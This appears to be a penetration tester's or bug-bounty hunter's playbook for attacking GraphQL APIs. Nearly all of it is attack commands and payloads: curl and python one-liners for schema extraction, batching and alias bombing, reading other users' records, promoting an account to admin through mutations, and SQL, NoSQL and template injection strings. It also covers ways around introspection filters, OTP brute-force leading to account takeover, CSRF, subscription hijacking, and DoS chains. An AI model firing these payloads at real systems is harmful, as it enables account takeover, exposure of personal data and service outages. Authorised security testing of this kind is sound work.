# GraphQL Audit

GraphQL flips the threat model — the client drives queries. One endpoint, huge surface. Introspection
hands you the schema; field suggestions give ~80% back even when it's off. Fire on any `/graphql`,
`/api/graphql`, or GQL-over-HTTP endpoint.

## Quick checklist
```
[ ] Introspection enabled? ({ __schema { queryType { name } } })
[ ] If off → clairvoyance field discovery
[ ] Fingerprint engine (graphw00f) — engine dictates CVEs
[ ] Query batching (array of 100) + alias bombing (500 aliases) — rate-limit/DoS
[ ] Field suggestions on typos leak schema even with introspection off
[ ] IDOR: query another user's object by id, no ownership check
[ ] Field-level authz: me { role isAdmin internalNote rawApiKey }
[ ] SQLi/NoSQLi/SSTI via string args (search/filter/id)
[ ] Subscriptions: subscribe to another user's events
[ ] Introspection/WAF bypass: newline, __type, GET, fragment, content-type switch
```

## Introspection
```bash
curl -s -X POST https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```
Full dump: the standard `IntrospectionQuery` (queryType/mutationType/types/fields/args/enums) → `schema.json`.
Look for: user-data mutations (updateUser/changeEmail/deleteAccount), `user(id:)`/`order(id:)` queries,
fields `internalNote/adminOnly/role/isAdmin/rawPassword/apiKey`, `AdminUser`/`DebugInfo` types,
deprecated fields (often forgotten auth), subscription types.

**Bypass when `__schema` blocked:**
```
{"query":"query {\n __schema\n { queryType { name } } }"}        # newline
{"query":"{ __type(name: \"User\") { fields { name } } }"}        # __type not __schema
GET /graphql?query={__schema{queryType{name}}}                    # GET-only filter
{"query":"fragment f on __Schema { queryType { name } } { ...f }"} # fragment
Content-Type: application/graphql                                  # content-type switch
```

## Field suggestions (introspection off)
Typo a field → "Did you mean X?" leaks names. Automate: `clairvoyance -u https://t/graphql -o schema.json`
(recovers ~80% of introspection). Seed with `--input-document` to speed up.

## Batching / DoS / brute-force amplifier
```bash
# 100 queries in one POST (array batching)
python3 -c "import json;print(json.dumps([{'query':'{ __typename }'}]*100))" | curl -s -X POST https://t/graphql -H 'Content-Type: application/json' -d @-
# 500 aliases (bypasses per-query limits)
python3 -c "print('{\"query\":\"{ '+' '.join(f'q{i}: __typename' for i in range(500))+' }\"}')" | curl -s -X POST https://t/graphql -H 'Content-Type: application/json' -d @-
```
Escalate: 100 login mutations/request bypass per-IP lockout; 1000-alias OTP brute → ATO; reset-password bombing.

## IDOR + enumeration
```bash
# query another user's object
-d '{"query":"{ user(id: 2) { email phone paymentMethods { last4 } } }"}'
# privileged fields on your own object
-d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'
# privileged mutation on another user
-d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
# alias-enumerate 50 users in one request
python3 -c "import json;print(json.dumps({'query':'{ '+' '.join(f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1,51))+' }'}))"
```

## Injection via arguments
```
SQLi:   { users(search: "admin'--") { id } }   /   { users(id: "1 AND SLEEP(5)--") { email } }
NoSQLi: { login(username: {"$gt":""}, password: {"$gt":""}) { token } }
SSTI:   mutation { updateProfile(bio: "{{7*7}}") { bio } }
```

## Authz / subscription / depth
- Unauth: send sensitive queries/mutations with no token.
- Horizontal→vertical: `updateUserRole(userId: ME, role: "ADMIN")` as a normal user.
- Deprecated fields: `userProfile(id:2){ legacyToken adminFlags }` — auth often loosened.
- Subscription: `subscription { orderUpdated(userId: VICTIM) { status total } }` over `wss://` (wscat) —
  critical if payment/message/location events aren't per-user scoped.
- Depth bomb: nest a circular type (`friends { friends { … } }`) ×20, measure time → DoS.

## Fingerprint → CVE
`graphw00f` → engine. Hasura (auth bypass, remote-schema injection), Apollo (old depth issues),
Graphene (Python resolver injection), Hot Chocolate/.NET (federation SSRF), WPGraphQL (lots of IDOR).

## Extended technique surface (beyond the basics)
- **Persisted queries / APQ bypass** — if the client sends only `extensions.persistedQuery.sha256Hash`,
  try the hash alone without ever registering the full query text (some servers accept any known-good
  hash from a prior capture without re-validating who registered it); also try sending a *different*
  query body paired with someone else's captured hash to see if the hash is trusted over the body.
- **GraphQL CSRF** — many servers accept the POST body regardless of `Content-Type`. Build an
  auto-submitting cross-origin HTML form posting `text/plain` (no preflight) with the mutation as the
  body — if it executes with the victim's cookies, that's CSRF into a GraphQL mutation.
- **Subscription auth-at-connect-only gap** — `connection_init` is authenticated, but individual
  `subscribe` messages sent afterward over the same WebSocket often aren't re-checked. Connect low-priv,
  then send a `subscribe` payload for a resource/room your role shouldn't reach.
- **Federation / gateway bypass** — in Apollo Federation or schema-stitching setups, look for the
  *subgraph* service reachable directly (internal hostname leaked via error stack traces, `_service {
  sdl }`, or js-mining.md hits) — hitting it directly often skips gateway-level auth entirely. Also try
  the `_entities` query with a crafted `representations` array to fetch by key across services.
- **Directive abuse against naive filters** — stack `@include(if:true)`/`@skip(if:false)` or a custom
  directive around a blocked field name to dodge regex/keyword-based query allowlists that only pattern-
  match top-level field text.
- **Error-based schema/data leak** — force a resolver error (wrong type, null, malformed arg) and read
  `errors[].message`/`errors[].extensions` — implementations frequently leak stack traces, raw SQL, or
  internal file paths there even with introspection fully disabled.
- **Query-cost bypass via fragment reuse** — if a depth/cost limiter exists, spread the same expensive
  field across many aliases, or reuse a fragment many times, to multiply real cost without increasing the
  cost-estimator's naive per-query-text metric.
- **Exposed GraphiQL / Apollo Sandbox / Playground in production** — treat as a recon goldmine even when
  raw `__schema` introspection is patched at the gateway — the IDE's local autocomplete cache or embedded
  schema JSON often still holds the full schema.
- **Alias-based rate-limit bypass** — alias the *same* sensitive mutation (login, OTP-verify, redeem-code)
  N times inside one POST to dodge a per-request (not per-operation) rate limiter — same mechanism as the
  batching/DoS section above, applied specifically to auth-adjacent mutations.
- **Mutation-aliasing cost-multiplication DoS** (real H1 report, HackerOne's own account-recovery flow,
  $12,500) — distinct from the rate-limit bypass above: alias an expensive MUTATION (not a cheap query) N
  times in one request; the backend executes each alias serially and fully, so cost scales linearly with
  alias count even with **invalid/dummy input** (no valid precondition needed, just an authenticated
  session). Detection: baseline 1-alias response time, add a 2nd alias, confirm time roughly doubles (not
  ~1x, which would mean the server dedupes) — that scaling *is* the vulnerability signal. Prove impact with
  a **small number of concurrent** multi-alias requests (3 requests × 4 aliases is enough) causing
  timeouts/500s — no botnet or high volume needed, which is what makes this fundable as real DoS rather
  than dismissed as theoretical. Valid even though it's authenticated, when it hits shared backend/worker
  resources on a security-sensitive flow (account recovery, password reset) — that's a different bar than
  the generic "rate limit absence" kill-list entry.
- **Interface/union type-confusion authz gap** — query a field only valid on one implementing type via an
  inline fragment (`... on AdminUser { internalNote }`) from a session that shouldn't resolve that type —
  field-level authz on the concrete type doesn't always get re-checked when reached through an interface.

## Chains
Introspection → admin mutation w/o auth = Critical. Batching → OTP brute → ATO = Critical. Field
suggestion → hidden field → IDOR = High. Unauth subscription → real-time PII = High. Depth bomb → DoS = Medium.
Persisted-query hash reuse → stale/unauthorized query execution = Med-High. Federation subgraph direct hit
→ gateway-auth bypass = Critical (full backend surface, no edge authz at all).

## Kill signals
404/410 consistently · generic "Unauthorized" with no suggestions · rate limit fires on query 2 · only
`__typename` reachable · Apollo federation gateway only (attack the downstream services instead).
